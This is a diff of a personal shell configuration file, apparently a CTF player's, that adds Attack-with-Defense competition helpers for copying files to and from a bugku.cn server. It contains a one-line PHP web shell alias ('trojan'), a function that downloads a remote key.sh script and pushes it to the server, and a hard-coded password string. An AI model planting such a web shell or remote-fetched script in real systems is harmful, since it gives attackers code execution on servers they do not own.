@@ -19,6 +19,35 @@ alias sizeof="du -sh"
 # hacker
 alias rustscan='docker run -it --rm --name rustscan rustscan/rustscan:2.0.0'
 alias trojan="echo '<?php @eval(\$_POST['attack']);?>'"
+# awd
+server="team1@192-168-1-180.pvp695.bugku.cn"
+port=2222
+alias pass="echo '0e9521b8817afabe993efe5e42b53156' | copy && echo pass_copied."
+function push-keysh(){
+  curl -fsSL love4cry.cn/key.sh -o key.sh
+  scp -P $port key.sh $server:~/key.sh
+  rm key.sh
+}
+function push-file(){
+  echo "from [$1] to server:[$2]"
+  if [ -d $1 ]; then scp -P $port -r $1 $server:$2;
+    else scp -P $port $1 $server:$2;
+  fi
+}
+function dump-file(){
+  echo "from server:[$1] to [$2]"
+  if [ -d $2 ]; then scp -P $port -r $server:$1 $2;
+    else scp -P $port $server:$1 $2;
+  fi
+}
+function dump-server(){
+  echo "ssh remote command..."
+  ssh -p $port $server "tar -Pczvf ~/dumped.tgz /var/www/html"
+  echo "downloading..."
+  scp -P $port $server:~/dumped.tgz .
+}
+# awd over
+
 function ipof(){
   ping $1 -c 1 | sed -n "1p" | cut -d '(' -f2|cut -d ')' -f1;
 }
@@ -51,11 +80,15 @@ if [[ $UNAME =~ "Darwin" ]]; then
     line=$(cat -n $host_file| grep -w cpu | awk -F" " '{print $1}')
     sudo gsed -i "$line c\\$1 cpu" $host_file 
   }
-  function push2wsl(){
+  function push-wsl(){
     scp $1 ybw@cpu:~/pwn/target
+    scp $1 ybw@cpu:/mnt/c/Users/27564/Desktop/pwnfiles
   }
 elif [[ $UNAME =~ "WSL2" ]]; then
   __conda="$HOME/.miniconda"
+  user="/mnt/c/Users/27564"
+  desktop="$user/Desktop"
+  downloads="$user/Downloads"
   echo "U are using WSL2! I know."
   export PATH=/mnt/c/Windows/System32:$PATH
   alias pwncp="cp /mnt/c/Users/27564/Desktop/pwnfiles/* ~/pwn/target && chmod a+x ~/pwn/target/*"
